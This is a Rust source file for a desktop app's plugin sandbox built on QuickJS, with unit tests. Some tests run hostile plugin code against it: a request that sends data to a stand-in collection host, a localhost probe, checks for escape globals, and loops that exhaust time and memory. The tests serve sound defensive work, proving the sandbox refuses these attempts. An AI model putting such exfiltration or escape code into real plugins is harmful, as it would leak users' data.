//! Runs plugin code in a QuickJS sandbox.
//!
//! The sandbox is an interpreter embedded in Kanso's own process, not the webview: plugin code
//! has no DOM, no access to the app's settings or keys, no file system, no timers and no
//! network of its own. It gets the `kanso` object defined in `prelude.js`, whose only ways out
//! are a log line and an HTTP request checked by [`check_request`]. Every call starts from a
//! fresh interpreter and is bounded in memory, stack depth, wall-clock time and number of
//! requests, so a broken or hostile plugin can at worst fail.

use super::http::{check_request, HttpTransport};
use rquickjs::context::EvalOptions;
use rquickjs::{CatchResultExt, Context, Function, Runtime};
use serde_json::{json, Value};
use std::cell::RefCell;
use std::collections::BTreeMap;
use std::rc::Rc;
use std::sync::Arc;
use std::time::{Duration, Instant};

const PRELUDE: &str = include_str!("prelude.js");

const MAX_LOG_LINES: usize = 60;
const MAX_LOG_LINE_CHARS: usize = 600;
const MAX_RESULT_BYTES: usize = 1024 * 1024;
const MAX_STORAGE_KEYS: usize = 64;
const MAX_STORAGE_KEY_CHARS: usize = 64;
const MAX_STORAGE_BYTES: usize = 512 * 1024;

/// Bounds of one plugin call.
#[derive(Debug, Clone)]
pub struct RunLimits {
    /// Wall-clock time for the whole call, network included.
    pub time: Duration,
    pub memory_bytes: usize,
    pub stack_bytes: usize,
    pub max_requests: u32,
    pub request_timeout: Duration,
    pub max_response_bytes: usize,
}

impl Default for RunLimits {
    fn default() -> Self {
        Self {
            time: Duration::from_secs(30),
            memory_bytes: 64 * 1024 * 1024,
            stack_bytes: 512 * 1024,
            max_requests: 48,
            request_timeout: Duration::from_secs(12),
            max_response_bytes: 4 * 1024 * 1024,
        }
    }
}

/// One call into a plugin.
pub struct HookCall<'a> {
    pub code: &'a str,
    /// Hosts the plugin's manifest declares.
    pub hosts: &'a [String],
    pub settings: &'a BTreeMap<String, String>,
    /// What the plugin stored in earlier runs (values are JSON documents).
    pub storage: &'a BTreeMap<String, String>,
    /// Interface language code (`it`, `en`, ...).
    pub locale: &'a str,
    pub app_version: &'a str,
    /// `gameDetails`, `home`, or `commands.<id>`.
    pub hook: &'a str,
    pub args: &'a Value,
}

#[derive(Debug, Clone, PartialEq)]
pub struct HookOutput {
    pub value: Value,
    /// The plugin's storage after the call, when it changed.
    pub storage: Option<BTreeMap<String, String>>,
    pub logs: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HookError {
    pub message: String,
    pub logs: Vec<String>,
}

#[derive(Default)]
struct HostState {
    logs: Vec<String>,
    requests: u32,
}

impl HostState {
    fn log(&mut self, line: &str) {
        if self.logs.len() < MAX_LOG_LINES {
            self.logs.push(line.chars().take(MAX_LOG_LINE_CHARS).collect());
        }
    }
}

/// Loads the plugin and calls one of its hooks with `args`.
pub fn run_hook(
    call: &HookCall<'_>,
    transport: Arc<dyn HttpTransport>,
    limits: &RunLimits,
) -> Result<HookOutput, HookError> {
    let state = Rc::new(RefCell::new(HostState::default()));
    let outcome = execute(call, transport, limits, &state);
    let logs = std::mem::take(&mut state.borrow_mut().logs);
    match outcome {
        Ok((value, storage)) => Ok(HookOutput {
            value,
            storage,
            logs,
        }),
        Err(message) => Err(HookError { message, logs }),
    }
}

fn execute(
    call: &HookCall<'_>,
    transport: Arc<dyn HttpTransport>,
    limits: &RunLimits,
    state: &Rc<RefCell<HostState>>,
) -> Result<(Value, Option<BTreeMap<String, String>>), String> {
    let engine_error = |e: rquickjs::Error| format!("the plugin sandbox could not start: {e}");
    let deadline = Instant::now() + limits.time;

    let runtime = Runtime::new().map_err(engine_error)?;
    runtime.set_memory_limit(limits.memory_bytes);
    runtime.set_max_stack_size(limits.stack_bytes);
    runtime.set_interrupt_handler(Some(Box::new(move || Instant::now() >= deadline)));
    let context = Context::full(&runtime).map_err(engine_error)?;

    let boot = json!({
        "settings": call.settings,
        "storage": call.storage,
        "locale": call.locale,
        "appVersion": call.app_version,
    })
    .to_string();
    let args = call.args.to_string();

    let reply: String = context.with(|ctx| -> Result<String, String> {
        let globals = ctx.globals();

        let http = {
            let hosts = call.hosts.to_vec();
            let state = Rc::clone(state);
            let request_timeout = limits.request_timeout;
            let max_requests = limits.max_requests;
            let max_response_bytes = limits.max_response_bytes;
            Function::new(ctx.clone(), move |payload: String| -> String {
                let answer = (|| -> Result<Value, String> {
                    let raw: Value = serde_json::from_str(&payload)
                        .map_err(|e| format!("invalid request: {e}"))?;
                    let request = check_request(&hosts, &raw)?;
                    {
                        let mut state = state.borrow_mut();
                        if state.requests >= max_requests {
                            return Err(format!("more than {max_requests} requests in one call"));
                        }
                        state.requests += 1;
                    }
                    let remaining = deadline
                        .checked_duration_since(Instant::now())
                        .filter(|left| !left.is_zero())
                        .ok_or("the plugin ran out of time")?;
                    let response =
                        transport.send(&request, remaining.min(request_timeout), max_response_bytes)?;
                    Ok(response.to_json())
                })();
                answer
                    .unwrap_or_else(|error| json!({ "error": error }))
                    .to_string()
            })
            .map_err(engine_error)?
        };
        let log = {
            let state = Rc::clone(state);
            Function::new(ctx.clone(), move |line: String| state.borrow_mut().log(&line))
                .map_err(engine_error)?
        };
        globals.set("__kanso_http", http).map_err(engine_error)?;
        globals.set("__kanso_log", log).map_err(engine_error)?;
        globals.set("__kanso_boot", boot).map_err(engine_error)?;

        ctx.eval::<(), _>(PRELUDE)
            .catch(&ctx)
            .map_err(|e| format!("the plugin sandbox could not start: {e}"))?;
        // Taken now, before the plugin's code can replace them
        let call_hook: Function = globals.get("__kanso_call").map_err(engine_error)?;
        let read_result: Function = globals.get("__kanso_result").map_err(engine_error)?;

        let explain = |error: rquickjs::CaughtError<'_>| -> String {
            if Instant::now() >= deadline {
                return format!("the plugin took longer than {} s", limits.time.as_secs());
            }
            let (summary, stack) = match &error {
                rquickjs::CaughtError::Exception(exception) => {
                    let name = exception
                        .get::<_, String>("name")
                        .unwrap_or_else(|_| "Error".to_string());
                    (
                        format!("{name}: {}", exception.message().unwrap_or_default()),
                        exception.stack().unwrap_or_default(),
                    )
                }
                other => (other.to_string(), String::new()),
            };
            state
                .borrow_mut()
                .log(format!("{summary}\n{}", stack.trim_end()).trim_end());
            summary.lines().next().unwrap_or("the plugin failed").trim().to_string()
        };

        let mut options = EvalOptions::default();
        options.filename = Some("main.js".to_string());
        ctx.eval_with_options::<(), _>(call.code, options)
            .catch(&ctx)
            .map_err(explain)?;

        call_hook
            .call::<_, ()>((call.hook, args.as_str()))
            .catch(&ctx)
            .map_err(explain)?;
        // Promises settle here: hooks may be written as async functions
        while ctx.execute_pending_job() {
            if Instant::now() >= deadline {
                return Err(format!("the plugin took longer than {} s", limits.time.as_secs()));
            }
        }
        read_result.call::<_, String>(()).catch(&ctx).map_err(explain)
    })?;

    if reply.len() > MAX_RESULT_BYTES {
        return Err("the plugin returned too much data".to_string());
    }
    let reply: Value = serde_json::from_str(&reply)
        .map_err(|e| format!("the plugin returned something unreadable: {e}"))?;
    if reply.get("ok").and_then(Value::as_bool) != Some(true) {
        let message = reply
            .get("error")
            .and_then(Value::as_str)
            .unwrap_or("the plugin failed")
            .chars()
            .take(400)
            .collect();
        return Err(message);
    }

    let storage = reply.get("storage").and_then(Value::as_object).and_then(|entries| {
        let entries: BTreeMap<String, String> = entries
            .iter()
            .filter_map(|(key, value)| Some((key.clone(), value.as_str()?.to_string())))
            .collect();
        let total: usize = entries.iter().map(|(key, value)| key.len() + value.len()).sum();
        let fits = entries.len() <= MAX_STORAGE_KEYS
            && total <= MAX_STORAGE_BYTES
            && entries.keys().all(|key| !key.is_empty() && key.chars().count() <= MAX_STORAGE_KEY_CHARS);
        if !fits {
            state
                .borrow_mut()
                .log("kanso.storage: over the limit, changes of this run were not saved");
        }
        fits.then_some(entries)
    });

    Ok((reply.get("value").cloned().unwrap_or(Value::Null), storage))
}

#[cfg(test)]
pub(crate) mod tests {
    use super::super::http::{HttpRequest, HttpResponse};
    use super::*;
    use std::sync::Mutex;

    type Answer = dyn Fn(&HttpRequest) -> Result<HttpResponse, String> + Send + Sync;

    /// Answers every request from a closure and remembers what was asked.
    pub(crate) struct FakeTransport {
        pub seen: Mutex<Vec<HttpRequest>>,
        answer: Box<Answer>,
    }

    impl FakeTransport {
        pub(crate) fn new(
            answer: impl Fn(&HttpRequest) -> Result<HttpResponse, String> + Send + Sync + 'static,
        ) -> Arc<Self> {
            Arc::new(Self {
                seen: Mutex::new(Vec::new()),
                answer: Box::new(answer),
            })
        }

        pub(crate) fn offline() -> Arc<Self> {
            Self::new(|request| Err(format!("unexpected request to {}", request.url)))
        }

        pub(crate) fn urls(&self) -> Vec<String> {
            self.seen.lock().unwrap().iter().map(|r| r.url.clone()).collect()
        }
    }

    impl HttpTransport for FakeTransport {
        fn send(
            &self,
            request: &HttpRequest,
            _timeout: Duration,
            _max_response_bytes: usize,
        ) -> Result<HttpResponse, String> {
            self.seen.lock().unwrap().push(request.clone());
            (self.answer)(request)
        }
    }

    pub(crate) fn ok_json(body: Value) -> Result<HttpResponse, String> {
        Ok(HttpResponse {
            status: 200,
            headers: vec![("content-type".to_string(), "application/json".to_string())],
            body: body.to_string(),
        })
    }

    struct Fixture {
        hosts: Vec<String>,
        settings: BTreeMap<String, String>,
        storage: BTreeMap<String, String>,
        limits: RunLimits,
    }

    impl Fixture {
        fn new() -> Self {
            Self {
                hosts: vec!["api.example.org".to_string()],
                settings: BTreeMap::new(),
                storage: BTreeMap::new(),
                limits: RunLimits::default(),
            }
        }

        fn run(
            &self,
            code: &str,
            hook: &str,
            args: Value,
            transport: Arc<FakeTransport>,
        ) -> Result<HookOutput, HookError> {
            run_hook(
                &HookCall {
                    code,
                    hosts: &self.hosts,
                    settings: &self.settings,
                    storage: &self.storage,
                    locale: "it",
                    app_version: "0.1.0",
                    hook,
                    args: &args,
                },
                transport,
                &self.limits,
            )
        }
    }

    #[test]
    fn calls_a_hook_with_its_argument_and_returns_plain_data() {
        let mut fixture = Fixture::new();
        fixture.settings.insert("unit".to_string(), "h".to_string());
        let code = r#"
            kanso.plugin({
              gameDetails(game) {
                kanso.log("asked about", game.title, { n: 1 });
                return {
                  badge: game.minutes / 60 + " " + kanso.settings.unit,
                  locale: kanso.locale,
                  label: kanso.t({ en: "Hours", it: "Ore" }),
                  api: kanso.apiVersion,
                };
              },
              commands: { pick: async (context) => ({ count: context.games.length }) },
            });
        "#;

        let output = fixture
            .run(code, "gameDetails", json!({"title": "Portal 2", "minutes": 120}), FakeTransport::offline())
            .expect("runs");
        assert_eq!(
            output.value,
            json!({"badge": "2 h", "locale": "it", "label": "Ore", "api": 1})
        );
        assert_eq!(output.logs, ["asked about Portal 2 {\"n\":1}"]);
        assert_eq!(output.storage, None, "nothing was stored");

        // Hooks may be async, and commands live under `commands`
        let output = fixture
            .run(code, "commands.pick", json!({"games": [1, 2, 3]}), FakeTransport::offline())
            .expect("runs");
        assert_eq!(output.value, json!({"count": 3}));

        let missing = fixture.run(code, "commands.other", json!({}), FakeTransport::offline());
        assert_eq!(missing.unwrap_err().message, "the plugin does not implement commands.other");
        let no_register = fixture.run("var x = 1;", "gameDetails", json!({}), FakeTransport::offline());
        assert!(no_register.unwrap_err().message.contains("never called kanso.plugin"));
    }

    #[test]
    fn the_home_hook_gets_the_library_and_may_have_nothing_to_show() {
        let fixture = Fixture::new();
        let code = r#"
            kanso.plugin({
              async home(context) {
                if (context.games.length === 0) return null;
                return { title: kanso.t({ en: "Today", it: "Oggi" }), games: [{ id: context.games[0].id, note: String(context.now) }] };
              },
            });
        "#;
        let output = fixture
            .run(code, "home", json!({"games": [{"id": "steam:1"}], "now": 42}), FakeTransport::offline())
            .expect("runs");
        assert_eq!(output.value, json!({"title": "Oggi", "games": [{"id": "steam:1", "note": "42"}]}));

        // `null` and `undefined` both arrive as "nothing"
        let nothing = fixture.run(code, "home", json!({"games": [], "now": 42}), FakeTransport::offline());
        assert_eq!(nothing.expect("runs").value, Value::Null);
        let undefined = fixture.run("kanso.plugin({ home() {} });", "home", json!({}), FakeTransport::offline());
        assert_eq!(undefined.expect("runs").value, Value::Null);

        // A plugin that says it provides a part of Home and does not: told so by name
        let missing = fixture.run("kanso.plugin({ gameDetails: () => null });", "home", json!({}), FakeTransport::offline());
        assert_eq!(missing.unwrap_err().message, "the plugin does not implement home");
    }

    #[test]
    fn the_example_in_the_plugin_guide_runs_as_written() {
        // The guide's first block of JavaScript is what authors copy: its `home` and its
        // command must run in the real sandbox and return what the guide says
        let guide = include_str!("../../../../../docs/PLUGINS.md");
        let start = guide.find("```js\n").expect("the guide has an example") + "```js\n".len();
        let code = &guide[start..start + guide[start..].find("\n```").expect("the example ends")];
        let fixture = Fixture::new();
        let library = json!({
            "games": [
                {"id": "steam:1", "title": "One", "status": "backlog", "genres": ["GDR"]},
                {"id": "gog:2", "title": "Two", "status": "playing", "genres": []},
                {"id": "epic:3", "title": "Three", "status": "backlog", "genres": []},
            ],
            "now": 42,
        });

        let home = fixture.run(code, "home", library.clone(), FakeTransport::offline()).expect("home runs");
        assert_eq!(
            home.value,
            json!({
                "title": "Ti aspettano",
                "gamesStyle": "cards",
                // A game without genres simply has no note
                "games": [{"id": "steam:1", "note": "GDR"}, {"id": "epic:3"}],
            })
        );
        let nothing = fixture.run(code, "home", json!({"games": [], "now": 42}), FakeTransport::offline());
        assert_eq!(nothing.expect("home runs").value, Value::Null, "no backlog: nothing on Home");

        let pick = fixture.run(code, "commands.pick", library, FakeTransport::offline()).expect("the command runs");
        assert_eq!(pick.value["title"], "Try this");
        assert_eq!(pick.value["games"][0]["note"], "Why not?");
    }

    #[test]
    fn requests_reach_only_the_declared_hosts() {
        let fixture = Fixture::new();
        let code = r#"
            kanso.plugin({
              gameDetails(game) {
                const found = kanso.http.getJson("https://api.example.org/search?q=" + encodeURIComponent(game.title));
                const posted = kanso.http.post("https://api.example.org/echo", { json: { id: found.id }, headers: { "X-Key": "k" } });
                let refused;
                try { kanso.http.get("https://evil.example/collect?d=" + found.id); } catch (error) { refused = error.message; }
                let local;
                try { kanso.http.get("http://127.0.0.1:8080/"); } catch (error) { local = error.message; }
                return { id: found.id, status: posted.status, ok: posted.ok, type: posted.headers["content-type"], refused, local };
              },
            });
        "#;
        let transport = FakeTransport::new(|request| {
            if request.url.contains("/search") {
                ok_json(json!({"id": 42}))
            } else {
                Ok(HttpResponse {
                    status: 404,
                    headers: vec![("content-type".to_string(), "text/plain".to_string())],
                    body: "nope".to_string(),
                })
            }
        });

        let output = fixture
            .run(code, "gameDetails", json!({"title": "Half-Life 2"}), Arc::clone(&transport))
            .expect("runs");
        assert_eq!(output.value["id"], 42);
        assert_eq!(output.value["status"], 404);
        assert_eq!(output.value["ok"], false);
        assert_eq!(output.value["type"], "text/plain");
        assert!(output.value["refused"].as_str().unwrap().contains("not listed"));
        assert!(output.value["local"].as_str().unwrap().contains("only https"));

        // Only the two allowed requests ever left the sandbox
        let seen = transport.seen.lock().unwrap();
        assert_eq!(seen.len(), 2);
        assert_eq!(seen[0].url, "https://api.example.org/search?q=Half-Life%202");
        assert_eq!(seen[1].method, "POST");
        assert_eq!(seen[1].body.as_deref(), Some("{\"id\":42}"));
        assert!(seen[1].headers.contains(&("Content-Type".to_string(), "application/json".to_string())));
        assert!(seen[1].headers.contains(&("X-Key".to_string(), "k".to_string())));
    }

    #[test]
    fn storage_is_handed_in_and_returned_only_when_changed() {
        let mut fixture = Fixture::new();
        fixture.storage.insert("token".to_string(), "\"abc\"".to_string());
        fixture.storage.insert("broken".to_string(), "{not json".to_string());
        let code = r#"
            kanso.plugin({
              gameDetails() {
                const before = [kanso.storage.get("token"), kanso.storage.get("missing", 7), kanso.storage.get("broken")];
                kanso.storage.set("visits", { count: 2 });
                kanso.storage.remove("token");
                return before;
              },
              commands: { peek: () => kanso.storage.get("token") },
            });
        "#;
        let output = fixture.run(code, "gameDetails", json!({}), FakeTransport::offline()).expect("runs");
        assert_eq!(output.value, json!(["abc", 7, null]));
        let storage = output.storage.expect("changed");
        assert_eq!(storage.get("visits").map(String::as_str), Some("{\"count\":2}"));
        assert!(!storage.contains_key("token"));

        let output = fixture.run(code, "commands.peek", json!({}), FakeTransport::offline()).expect("runs");
        assert_eq!(output.value, json!("abc"));
        assert_eq!(output.storage, None);

        // A plugin that hoards is told so and loses the changes of that run
        let hoard = r#"kanso.plugin({ gameDetails() { for (let i = 0; i < 100; i++) kanso.storage.set("k" + i, i); return 1; } });"#;
        let output = fixture.run(hoard, "gameDetails", json!({}), FakeTransport::offline()).expect("runs");
        assert_eq!(output.storage, None);
        assert!(output.logs.iter().any(|line| line.contains("over the limit")));
    }

    #[test]
    fn the_sandbox_has_no_way_out_and_survives_hostile_code() {
        let mut fixture = Fixture::new();
        fixture.limits.time = Duration::from_millis(400);
        fixture.limits.memory_bytes = 16 * 1024 * 1024;
        fixture.limits.max_requests = 3;
        let hook = |body: &str| format!("kanso.plugin({{ gameDetails() {{ {body} }} }});");

        // Nothing but the language itself and `kanso`
        let output = fixture
            .run(
                &hook(r#"return ["fetch", "XMLHttpRequest", "WebSocket", "require", "process", "window", "document",
                          "std", "os", "setTimeout", "__kanso_http", "__kanso_log", "__kanso_boot", "__TAURI_INTERNALS__"]
                          .filter((name) => typeof globalThis[name] !== "undefined");"#),
                "gameDetails",
                json!({}),
                FakeTransport::offline(),
            )
            .expect("runs");
        assert_eq!(output.value, json!([]));

        // The API cannot be replaced from inside
        let output = fixture
            .run(
                &hook(r#""use strict"; let frozen = 0;
                         try { kanso.http = null; } catch (e) { frozen++; }
                         try { kanso.settings.apiKey = "x"; } catch (e) { frozen++; }
                         try { kanso.http.get = () => 1; } catch (e) { frozen++; }
                         return frozen;"#),
                "gameDetails",
                json!({}),
                FakeTransport::offline(),
            )
            .expect("runs");
        assert_eq!(output.value, json!(3));

        let fails = |body: &str| {
            fixture
                .run(&hook(body), "gameDetails", json!({}), FakeTransport::new(|_| ok_json(json!({}))))
                .expect_err(body)
                .message
        };
        assert!(fails("while (true) {}").contains("took longer"));
        assert!(fails("return new Promise(() => {});").contains("never settled"));
        assert!(fails("const hog = []; while (true) hog.push('x'.repeat(1 << 20));").contains("out of memory"));
        assert!(fails("const dive = () => dive(); dive();").to_lowercase().contains("stack"));
        assert!(fails("throw new TypeError('bad thing');").contains("TypeError: bad thing"));
        assert!(fails("return Promise.reject(new Error('later'));").contains("Error: later"));
        assert!(fails("null.title;").contains("TypeError"));
        assert!(
            fails("for (let i = 0; i < 9; i++) kanso.http.get('https://api.example.org/' + i); return 1;")
                .contains("more than 3 requests")
        );
        let cyclic = fails("const a = {}; a.self = a; return a;");
        assert!(cyclic.contains("not plain data"), "{cyclic}");

        // A syntax error is reported with the file name the author knows
        let broken = fixture
            .run("kanso.plugin({ gameDetails() { return ; ", "gameDetails", json!({}), FakeTransport::offline())
            .unwrap_err();
        assert!(broken.message.contains("SyntaxError"), "{}", broken.message);
        assert!(broken.logs.iter().any(|line| line.contains("main.js")), "{:?}", broken.logs);
    }

    #[test]
    fn two_runs_share_nothing_and_random_numbers_differ() {
        let fixture = Fixture::new();
        let code = r#"
            globalThis.counter = (globalThis.counter || 0) + 1;
            kanso.plugin({ gameDetails: () => ({ counter: globalThis.counter, random: Math.random() }) });
        "#;
        let first = fixture.run(code, "gameDetails", json!({}), FakeTransport::offline()).unwrap().value;
        std::thread::sleep(Duration::from_millis(5));
        let second = fixture.run(code, "gameDetails", json!({}), FakeTransport::offline()).unwrap().value;
        assert_eq!((first["counter"].as_i64(), second["counter"].as_i64()), (Some(1), Some(1)));
        assert_ne!(first["random"], second["random"]);
    }
}
